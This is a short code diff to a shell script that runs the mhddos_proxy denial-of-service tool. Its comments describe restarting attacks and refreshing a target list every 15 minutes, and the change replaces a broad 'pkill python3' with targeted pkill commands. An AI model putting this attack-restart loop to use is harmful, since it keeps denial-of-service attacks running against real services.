@@ -27,8 +27,7 @@ proxy_interval="3600"
 proxy_interval="-p $proxy_interval"
 
 #Just in case kill previous copy of mhddos_proxy
-pkill -f start.py
-pkill python3
+pkill -f start.py; pkill -f runner.py
 
 # Restart attacks and update targets list every 15 minutes (by default)
 while true
@@ -65,6 +64,5 @@ do
 echo -e "#####################################\n"
 sleep $restart_interval
 echo -e "RESTARTING\n"
-pkill -f start.py #In theory should work but doesn't give good results
-pkill python3 #It just works (c)
+pkill -f start.py; pkill -f runner.py
 done
